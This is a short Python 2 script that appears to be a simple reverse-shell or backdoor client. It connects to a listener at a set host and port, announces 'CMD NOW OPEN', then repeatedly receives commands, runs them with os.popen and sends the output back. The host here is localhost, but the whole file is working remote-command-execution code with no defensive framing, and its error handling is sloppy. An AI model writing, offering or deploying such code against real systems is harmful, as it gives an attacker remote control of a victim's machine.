import socket, os

HOST = "127.0.0.1"
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((HOST,PORT))

    s.send("CMD NOW OPEN")

    s.close()

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        cmd = s.recv(1024)
        print cmd
        ret = os.popen(str(cmd)).readlines()
        output = ""
        for thing in ret:
            output += thing
        print output
        s.send(output)


except ValueError:
    "something went wrong"
    s.close()